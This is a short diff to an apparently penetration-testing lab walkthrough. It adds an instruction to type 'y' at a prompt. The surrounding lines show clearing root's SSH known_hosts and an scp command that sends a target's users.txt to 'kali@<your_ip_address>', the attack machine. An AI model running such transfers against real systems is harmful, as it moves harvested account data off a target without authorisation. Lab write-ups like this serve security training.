@@ -346,6 +346,8 @@ echo '' > /root/.ssh/known_hosts
 scp users.txt kali@<your_ip_address>:.
 ```
 
+type `y`
+
 NOTE: Make sure to replace <your_ip_address> with the actual IP address of your attack machine, and this will drop in your kali home.
 
 4. On your attack machine, open a new terminal, navigate to your home folder, and check if the file has been transferred successfully:
